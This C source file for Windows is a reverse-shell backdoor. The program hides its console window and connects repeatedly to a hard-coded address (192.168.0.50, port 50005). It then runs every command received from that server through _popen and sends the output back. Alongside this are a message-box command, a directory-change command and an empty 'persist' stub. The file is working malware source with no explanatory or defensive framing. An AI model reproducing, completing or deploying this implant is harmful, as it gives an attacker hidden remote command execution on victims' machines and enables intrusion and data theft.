#include <stdio.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <sys/stat.h>

#pragma comment(lib, "ws2_32.lib")
#define SetZero(p, size) (void) memset((p), 0, (size))




SOCKET s;
void Shell(){

    // get command from server 
    char buff[1024];
    char container[1024];
    char total_res[18384];

   

    while(1){
        SetZero(&buff, sizeof(buff));
        SetZero(&container, sizeof(container));
        SetZero(&total_res, sizeof(total_res));

        
        /*responces,
        sock
        where
        size
        0
        */

       
        recv(s, buff, sizeof(buff), 0);

        if (strncmp("q", buff, 1) == 0) {
            closesocket(s);
            WSACleanup();
            exit(0);
        }
        // cd command
        else if(strncmp("cd ", buff, 3) == 0){
            char* ptr = buff + 3;
            chdir(ptr);
        }

        // TODO
        else if(strncmp("persist", buff, 7) == 0 ){
           
        }

        else if(strncmp("display ", buff, 8) == 0){
            char* ptr = buff + 8;
            MessageBox(NULL, ptr, "Amonus", MB_OK);
        }
        

        
        FILE* fp;

        // open file as a process
        fp =  _popen(buff, "r");

        while(fgets(container, sizeof(container), fp) != NULL){
            strcat(total_res, container);
        }

        send(s, total_res, sizeof(total_res), 0);

        fclose(fp);
        
    }
}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdSHow)
{

 HWND console_window;
    AllocConsole();

    // gets top level window, class name, window name
    console_window = FindWindowA("ConsoleWindowClass", NULL);

    // HWND, show type, 
    // hiding the window using 0
    ShowWindow(console_window, 0);

    WSADATA wsa;
    
    struct sockaddr_in server;

    printf("\nInitialising Winsock...");
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0){
        printf("Failed: %d", WSAGetLastError());
        return 1;
    }

    printf("Initialised.\n");

    //Create a socket
    if((s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) == INVALID_SOCKET)
    {
        printf("Cant create socket: %d", WSAGetLastError());
        WSACleanup();
        return 1;
    }

    printf("Socket created. Connecting...\n");
    memset(&server, 0, sizeof server);
    server.sin_addr.s_addr = inet_addr("192.168.0.50");         // ip address
    server.sin_family = AF_INET;                                // IPV4/TCP
    server.sin_port = htons(50005);                             // port

    //Connect to remote server
    while (connect(s, (struct sockaddr *) &server, sizeof(server)) < 0)
    {        
        Sleep(100);
    }

    // on conncet run shell code     
    Shell();

    closesocket(s);
    WSACleanup();
    return 0;
}